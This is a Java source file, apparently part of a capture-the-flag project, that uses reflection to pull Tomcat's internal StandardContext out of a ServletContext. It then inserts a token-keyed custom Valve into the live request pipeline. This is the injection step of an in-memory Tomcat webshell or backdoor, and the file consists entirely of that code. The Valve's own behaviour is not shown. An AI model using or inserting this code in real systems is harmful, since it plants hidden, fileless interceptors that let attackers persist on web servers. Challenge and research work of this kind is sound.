package ctf.ghostvalve.bridge;

import java.lang.reflect.Field;
import javax.servlet.ServletContext;
import org.apache.catalina.Pipeline;
import org.apache.catalina.Valve;
import org.apache.catalina.core.StandardContext;

public final class ReviewValveBootstrap {
    private static volatile String installedToken;
    private static volatile Valve installedValve;

    private ReviewValveBootstrap() {
    }

    public static synchronized void mount(String token) throws Exception {
        if (token == null || token.trim().isEmpty()) {
            throw new IllegalArgumentException("token");
        }
        if (token.equals(installedToken)) {
            return;
        }
        ServletContext servletContext = BridgeRuntime.current();
        if (servletContext == null) {
            throw new IllegalStateException("bridge runtime missing");
        }
        StandardContext context = extractContext(servletContext);
        Pipeline pipeline = context.getPipeline();
        if (installedValve != null) {
            pipeline.removeValve(installedValve);
        }
        installedValve = new ReviewValve(token);
        pipeline.addValve(installedValve);
        installedToken = token;
        ThemeAssemblyBootstrap.bindToken(token);
    }

    private static StandardContext extractContext(ServletContext servletContext) throws Exception {
        Field facadeField = servletContext.getClass().getDeclaredField("context");
        facadeField.setAccessible(true);
        Object applicationContext = facadeField.get(servletContext);
        Field contextField = applicationContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        return (StandardContext) contextField.get(applicationContext);
    }
}
